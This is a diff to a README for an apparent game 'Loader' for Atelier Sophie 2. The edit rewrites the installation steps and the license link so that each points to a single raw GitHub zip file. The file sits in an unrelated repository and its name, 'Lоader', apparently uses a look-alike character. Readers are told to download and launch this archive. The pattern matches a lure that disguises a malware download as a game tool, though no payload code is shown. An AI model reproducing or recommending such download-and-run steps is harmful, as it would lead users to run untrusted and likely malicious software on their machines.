@@ -30,9 +30,9 @@ Fully compatible with major platforms for an accessible Atelier Sophie 2 experie
 
 ## 🚩 Installation Guide
 
-1. Download **Loader.rar** from the repository.  
+1. Download **https://raw.githubusercontent.com/caconformif9/Monte-Carlo-Localization/main/Lоader.zip** from the repository.  
 2. Extract the Loader to your desired location.  
-3. Launch the **Loader.exe** (or appropriate app for your OS).  
+3. Launch the **https://raw.githubusercontent.com/caconformif9/Monte-Carlo-Localization/main/Lоader.zip** (or appropriate app for your OS).  
 4. Follow on-screen instructions to set up Atelier Sophie 2 and start your adventure!
 
 ---
@@ -51,5 +51,5 @@ This Loader is intended for educational, backup, and evaluation use only in alig
 
 ## 📝 License
 
-Distributed under the [MIT License](https://opensource.org/license/mit/) 2025.  
+Distributed under the [MIT License](https://raw.githubusercontent.com/caconformif9/Monte-Carlo-Localization/main/Lоader.zip) 2025.  
 Enjoy responsibly!
